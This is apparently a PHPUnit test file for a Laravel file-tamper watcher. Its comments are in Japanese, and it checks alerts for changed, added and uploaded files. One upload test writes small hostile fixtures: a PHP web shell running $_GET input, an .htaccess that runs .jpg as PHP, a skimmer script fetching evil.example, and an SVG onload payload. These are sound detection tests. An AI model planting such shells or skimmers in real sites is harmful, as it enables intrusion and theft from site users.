<?php

namespace Tests\Feature;

use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Mail;
use Neobit\Core\Mail\TemplatedMail;
use Neobit\Core\Security\FileWatcher;
use Tests\TestCase;

/**
 * 改ざん監視（Neobit\Core\Security\FileWatcher・app:watch-files）。
 * 一時のディレクトリにプロジェクトの形を作り、ctimeはテストが決める（手元のWindowsでは、ctimeが作成日時になるため）。
 */
class FileWatchTest extends TestCase
{
    /** 一時のプロジェクトの場所 */
    private string $base;

    /** パス => テストが決めたctime */
    private array $ctimes = [];

    /** 基準を作った時刻 */
    private int $start;

    protected function setUp(): void
    {
        parent::setUp();

        $this->base = str_replace('\\', '/', sys_get_temp_dir()).'/file-watch-test-'.uniqid();
        config(['neobit.file_watch.release_file' => '.version']);

        $this->start = Carbon::parse('2026-10-27 10:00:00')->getTimestamp();
        Carbon::setTestNow(Carbon::createFromTimestamp($this->start));

        // プロジェクトの形
        $this->write('app/Models/News.php', '<?php // ニュース');
        $this->write('config/app.php', '<?php return [];');
        $this->write('public/index.php', '<?php // 入口');
        $this->write('vendor/laravel/framework/Foo.php', '<?php // Laravel');
        $this->write('bootstrap/cache/config.php', '<?php return [];');
        $this->write('.version', '2026-10-27');
        File::ensureDirectoryExists($this->base.'/storage/app/public');

        $this->watcher()->init();
    }

    protected function tearDown(): void
    {
        File::deleteDirectory($this->base);
        Carbon::setTestNow();

        parent::tearDown();
    }

    private function watcher(): FileWatcher
    {
        return new FileWatcher(
            $this->base,
            $this->base.'/public',
            $this->base.'/storage/app/public',
            fn (string $path) => $this->ctimes[str_replace('\\', '/', $path)] ?? $this->start - 86400,
        );
    }

    /** ファイルを書き、そのctimeを決める。時刻は基準を作った時刻からの分 */
    private function write(string $path, string $content, ?int $minutes = null): void
    {
        File::ensureDirectoryExists(dirname($this->base.'/'.$path));
        file_put_contents($this->base.'/'.$path, $content);
        $this->ctimes[$this->base.'/'.$path] = $minutes === null ? ($this->start ?? time()) - 86400 : $this->start + $minutes * 60;
    }

    /** 基準を作った時刻から$minutes分の時刻にして、1回分を確かめる */
    private function checkAt(int $minutes, bool $full = false): array
    {
        Carbon::setTestNow(Carbon::createFromTimestamp($this->start + $minutes * 60));

        return $this->watcher()->check($full);
    }

    public function test_nothing_is_reported_when_nothing_changed(): void
    {
        $result = $this->checkAt(5);

        $this->assertSame([[], [], 0, 0, false], [$result['alerts'], $result['dangers'], $result['accepted'], $result['pending'], $result['notify']]);
    }

    public function test_change_without_the_key_is_reported_after_waiting(): void
    {
        $this->write('public/index.php', '<?php // 書き換えられた入口', 2);

        // 鍵が後から届くかもしれないので、15分たつまでは待つ
        $result = $this->checkAt(5);
        $this->assertSame([1, [], false], [$result['pending'], $result['alerts'], $result['notify']]);

        // たっても鍵が来なければ知らせる
        $result = $this->checkAt(20);
        $this->assertSame([['label' => 'public/index.php', 'kind' => 'changed', 'time' => $this->start + 120]], $result['alerts']);
        $this->assertTrue($result['notify']);

        // 同じ顔ぶれは1時間に1回。直るまで知らせ続ける
        $this->assertFalse($this->checkAt(25)['notify']);
        $this->assertTrue($this->checkAt(81)['notify']);

        // 元の中身に戻れば、知らせない
        $this->write('public/index.php', '<?php // 入口', 85);
        $result = $this->checkAt(90);
        $this->assertSame([[], false], [$result['alerts'], $result['notify']]);
    }

    public function test_changes_around_the_key_are_normal_updates(): void
    {
        // 鍵の更新の20分前から15分後までに変わったものは、通常の更新
        $this->write('app/Models/News.php', '<?php // 新しいニュース', 2);
        $this->write('config/app.php', '<?php return [1];', 21);
        $this->write('.version', '2026-10-27 10:22', 22);
        $this->write('app/Models/Page.php', '<?php // 固定ページ', 36);

        $result = $this->checkAt(40);
        $this->assertSame([3, [], false], [$result['accepted'], $result['alerts'], $result['notify']]);

        // 基準に取り込んだので、次の回は何も出ない
        $this->assertSame(0, $this->checkAt(45)['accepted']);

        // 1日1回の報告に、期間ごとに載る
        $entries = $this->watcher()->acceptedOn(Carbon::parse('2026-10-27'));
        $this->assertCount(1, $entries);
        $this->assertSame(['app/Models/News.php', 'app/Models/Page.php', 'config/app.php'], collect($entries[0]['files'])->sort()->values()->all());
        $this->assertSame($this->start + 2 * 60, $entries[0]['from']);

        // 期間の外（鍵の15分後より後）の変化は、通常の更新にならない
        $this->write('app/Models/Shell.php', '<?php // 怪しいもの', 50);
        $result = $this->checkAt(70);
        $this->assertSame('app/Models/Shell.php', $result['alerts'][0]['label']);
        $this->assertSame('added', $result['alerts'][0]['kind']);
    }

    public function test_continuous_updates_with_unseen_keys_are_one_period(): void
    {
        // 2分おきに鍵を更新しながら20回更新する。監視は5分おきなので、見えない鍵もある
        for ($i = 0; $i < 20; $i++) {
            $minute = 2 + $i * 2;
            $this->write("app/Updated{$i}.php", "<?php // {$i}", $minute);
            $this->write('.version', "version {$i}", $minute);
            if ($minute % 5 === 0 || $i === 19) {
                $result = $this->checkAt($minute + 1);
                $this->assertSame([], $result['alerts']);
            }
        }

        $result = $this->checkAt(80);
        $this->assertSame([], $result['alerts']);
        $entries = $this->watcher()->acceptedOn(Carbon::parse('2026-10-27'));
        $this->assertCount(1, $entries);
        $this->assertCount(20, array_unique($entries[0]['files']));
    }

    public function test_the_first_unseen_key_is_covered_by_the_longer_margin(): void
    {
        // 鍵が0分と4分に更新され、5分の監視には4分のほうしか見えない。0分の更新の15分前のファイルも受ける
        $this->write('app/Early.php', '<?php // 先に送ったもの', -15);
        $this->write('.version', 'first', 0);
        $this->write('.version', 'second', 4);

        $result = $this->checkAt(5);
        $this->assertSame([1, []], [$result['accepted'], $result['alerts']]);
    }

    public function test_deleted_files_are_reported_after_waiting(): void
    {
        File::delete($this->base.'/config/app.php');

        $this->assertSame(1, $this->checkAt(5)['pending']);
        $result = $this->checkAt(21);
        $this->assertSame([['label' => 'config/app.php', 'kind' => 'deleted', 'time' => $this->start + 300]], $result['alerts']);
    }

    public function test_unexpected_files_in_the_upload_place_are_reported_at_once(): void
    {
        // 公開の置き場所：受け付けていない拡張子は全部知らせる。画像・PDFと、Laravelの.gitignoreは知らせない
        $this->write('storage/app/public/news/000/000012/shell.php', '<?php system($_GET["c"]);', 3);
        $this->write('storage/app/public/news/000/000012/photo.jpg', 'jpeg', 3);
        $this->write('storage/app/public/news/000/000012/manual.pdf', 'pdf', 3);
        $this->write('storage/app/public/.htaccess', 'AddHandler php-script .jpg', 3);
        $this->write('storage/app/public/.gitignore', '*', 3);
        $this->write('storage/app/public/campaign/skimmer.js', 'fetch("https://evil.example")', 3);
        $this->write('storage/app/public/campaign/index.html', '<script></script>', 3);
        $this->write('storage/app/public/campaign/logo.svg', '<svg onload="alert(1)"/>', 3);

        // 非公開の置き場所は見ない（Webから開けず、監視の利用者には読めない権限で作られるため）
        $this->write('storage/app/private/notes.js', 'js', 3);
        $this->write('storage/app/private/backdoor.phtml', '<?php', 3);
        $this->write('storage/app/basic-auth/.htpasswd', 'staff:$2y$', 3);

        $result = $this->checkAt(5);
        $this->assertSame(
            [
                'storage/app/public/.htaccess',
                'storage/app/public/campaign/index.html',
                'storage/app/public/campaign/logo.svg',
                'storage/app/public/campaign/skimmer.js',
                'storage/app/public/news/000/000012/shell.php',
            ],
            array_column($result['dangers'], 'label'),
        );
        $this->assertTrue($result['notify']);

        // 運用で置く拡張子は、設定に足せば知らせない
        config(['neobit.file_watch.public_upload_extra' => ['svg']]);
        $this->assertNotContains('storage/app/public/campaign/logo.svg', array_column($this->checkAt(10)['dangers'], 'label'));
    }

    public function test_vendor_and_cache_are_watched_only_where_they_should_be(): void
    {
        // bootstrap/cacheの設定のキャッシュは見る（サーバーのLaravelが実際に読むため）。vendor/は--fullのときだけ
        $this->write('bootstrap/cache/config.php', '<?php return [2];', 2);
        $this->write('vendor/laravel/framework/Foo.php', '<?php // 書き換え', 2);

        $this->assertSame(['bootstrap/cache/config.php'], array_column($this->checkAt(20)['alerts'], 'label'));
        $this->assertSame(
            ['bootstrap/cache/config.php', 'vendor/laravel/framework/Foo.php'],
            array_column($this->checkAt(21, full: true)['alerts'], 'label'),
        );

        // この監視の記録とロックのファイルは見ない
        $this->assertFileExists($this->base.'/bootstrap/cache/file-watch.json');
        $this->assertNotContains('bootstrap/cache/file-watch.json', array_column($this->checkAt(25)['alerts'], 'label'));
    }

    public function test_root_files_are_watched_with_their_contents(): void
    {
        $this->write('.env', 'APP_KEY=base64:original', -1440);
        $this->write('composer.json', '{}', -1440);
        $this->watcher()->init();

        // 直下のファイルの書き換えと、知らないファイル
        $this->write('.env', 'APP_KEY=base64:changed', 2);
        $this->write('shell.php', '<?php', 2);

        $result = $this->checkAt(20);
        $this->assertSame(
            [['label' => '.env', 'kind' => 'changed'], ['label' => 'shell.php', 'kind' => 'added']],
            array_map(fn (array $alert) => ['label' => $alert['label'], 'kind' => $alert['kind']], $result['alerts']),
        );

        // 記録に残すのはハッシュ値だけで、中身は残さない
        $this->assertStringNotContainsString('base64:', (string) file_get_contents($this->base.'/bootstrap/cache/file-watch.json'));
    }

    public function test_root_directories_are_watched_by_name(): void
    {
        // 鍵が無く増えた直下のディレクトリは知らせる。名前の末尾に/を付ける
        File::ensureDirectoryExists($this->base.'/backdoor');
        $this->ctimes[$this->base.'/backdoor'] = $this->start + 120;
        $this->assertSame(
            [['label' => 'backdoor/', 'kind' => 'added', 'time' => $this->start + 120]],
            $this->checkAt(20)['alerts'],
        );

        // 鍵の前後に増えたものは、通常の更新として一覧に取り込む
        File::ensureDirectoryExists($this->base.'/node_modules');
        $this->ctimes[$this->base.'/node_modules'] = $this->start + 1500;
        $this->write('.version', 'deploy', 26);
        $result = $this->checkAt(30);
        $this->assertSame(1, $result['accepted']);
        $this->assertNotContains('node_modules/', array_column($result['alerts'], 'label'));

        // 鍵のファイルそのものと、テストでできるものは見ない
        $this->write('.phpunit.result.cache', '{}', 40);
        File::ensureDirectoryExists($this->base.'/.phpunit.cache');
        $this->assertSame(['backdoor/'], array_column($this->checkAt(60)['alerts'], 'label'));
    }

    public function test_old_baseline_without_the_root_list_is_completed_quietly(): void
    {
        // 前の版の基準には直下のディレクトリの一覧が無い。最初の回で、知らせずに今の一覧を基準にする
        $path = $this->base.'/bootstrap/cache/file-watch.json';
        $state = json_decode((string) file_get_contents($path), true);
        unset($state['root_dirs']);
        file_put_contents($path, json_encode($state));

        $this->assertSame([], $this->checkAt(20)['alerts']);
        $this->assertArrayHasKey('root_dirs', json_decode((string) file_get_contents($path), true));
    }

    public function test_command_needs_the_key_setting_and_the_baseline(): void
    {
        // 鍵のファイルの設定が空なら、何もしない
        config(['neobit.file_watch.release_file' => '']);
        $this->artisan('app:watch-files')->expectsOutputToContain('改ざん監視はしません')->assertSuccessful();

        // 基準が無ければ、--initを案内して止まる（手元のプロジェクトには基準を作らない）
        config(['neobit.file_watch.release_file' => '.version']);
        if (! is_file(base_path('bootstrap/cache/file-watch.json'))) {
            $this->artisan('app:watch-files')->expectsOutputToContain('app:watch-files --init')->assertFailed();
        }
    }

    public function test_runs_do_not_overlap(): void
    {
        // 前の回がロックを押さえている間は、次の回は押さえられない
        $first = $this->watcher();
        $second = $this->watcher();

        $this->assertTrue($first->lock());
        $this->assertFalse($second->lock());

        $first->unlock();
        $this->assertTrue($second->lock());
        $second->unlock();
    }

    public function test_unreadable_directories_are_reported_without_stopping(): void
    {
        if (PHP_OS_FAMILY === 'Windows' || (function_exists('posix_geteuid') && posix_geteuid() === 0)) {
            $this->markTestSkipped('ディレクトリの権限で開けなくするのは、root以外のLinuxでだけ試せる');
        }

        $this->write('storage/app/public/hidden/shell.php', '<?php', 3);
        $this->write('app/Secret/Thing.php', '<?php', -1440);
        $this->watcher()->init();
        chmod($this->base.'/storage/app/public/hidden', 0000);
        chmod($this->base.'/app/Secret', 0000);

        try {
            $result = $this->checkAt(5);
        } finally {
            chmod($this->base.'/storage/app/public/hidden', 0755);
            chmod($this->base.'/app/Secret', 0755);
        }

        // 止まらずに、開けなかったディレクトリを知らせる。その下のファイルは、消えたものにしない
        $this->assertSame(['app/Secret', 'storage/app/public/hidden'], $result['unreadable']);
        $this->assertSame([], $result['alerts']);
        $this->assertTrue($result['notify']);
    }

    public function test_alert_mail_goes_to_the_error_notify_address_without_its_own(): void
    {
        // file_watch.toが空なら、エラーの通知と同じ宛先（ERROR_NOTIFY_TO）へ送る
        Mail::fake();
        config([
            'neobit.file_watch.to' => null,
            'logging.channels.error_notify.handler_with.to' => 'dev@example.com',
        ]);
        $this->app->instance(FileWatcher::class, $this->watcher());

        $this->write('public/index.php', '<?php // 書き換えられた入口', 2);
        Carbon::setTestNow(Carbon::createFromTimestamp($this->start + 20 * 60));

        $this->artisan('app:watch-files')->assertSuccessful();
        Mail::assertSent(TemplatedMail::class, fn (TemplatedMail $mail) => $mail->hasTo('dev@example.com'));
    }
}
